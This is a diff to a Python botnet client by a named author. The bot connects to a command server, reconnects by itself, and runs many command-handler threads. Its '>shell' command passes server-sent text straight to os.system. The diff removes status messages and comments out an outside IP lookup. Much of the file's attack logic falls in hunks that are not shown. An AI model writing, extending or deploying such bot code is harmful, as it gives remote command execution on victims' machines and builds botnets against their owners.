@@ -1,13 +1,14 @@
 # This was programmed by Feitan alone. All suggestions are welcome, (A part from the ones that ask for functions from RATs)
-# Reminder - Startup might be broken need to test on x7041 server
-# Reminder - Auto reconnect MIGHT not work need testing on x7041 server
-# Reminder - Need to test >shell command on x7041 server
+# Reminder - Startup is broken need to test on x7041 server
+# Reminder - Auto reconnect does not work need testing on x7041 server
+# Reminder - >Shell wont work on linux for some reason
 import os
 import sys
 import time
 import socket
 import random
 import threading
+from json import load
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -64,31 +65,32 @@ except:
 while not connected:
 	try:
 		sock.connect((host, port))
-		sock.send(bytes("Data"))
+		#ip = load(urlopen('http://jsonip.com'))['ip']
+		ip = "localhost"
+		sock.send(ip)
 		connected = True
-		print("Connected")
 	except:
 		pass
-		
+
 while connected is True:
 	try:
 		def commands():
 			global attk
 			global active
+			global connected
 
 			msg = sock.recv(512)
 			sock.send(bytes("Data"))
 
-			if msg.lower().startswith(">killbots"):
+			if msg.lower().startswith(">dup"):
 				try:
-					sys.exit()
+					connected = False
 				except:
 					pass
 
 			if msg.lower().startswith(">shell"):
 				try:
-					length = int(len(msg))
-					shell = msg[7:length]
+					shell = msg[7:]
 					os.system(shell)
 				except:
 					pass
@@ -270,19 +272,20 @@ while connected is True:
 		commands()
 
 		for i in range(100):
-		    thread = threading.Thread(target=commands, args=(""), name='Command Handler')
-		    thread.setDaemon(True)
-		    thread.start()
-		    
+			thread = threading.Thread(target=commands, args=(""), name='Command Handler')
+			thread.setDaemon(True)
+			thread.start()
+
 	except socket.error:
 		connected = False
 		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		print("Disconnected")
 		while not connected:
 			try:
 				sock.connect((host, port))
+				#ip = load(urlopen('http://jsonip.com'))['ip']
+				ip = "localhost"
+				sock.send(ip)
 				connected = True
-				print("Reconnected")
 			except socket.error:
 				pass
 sock.close()
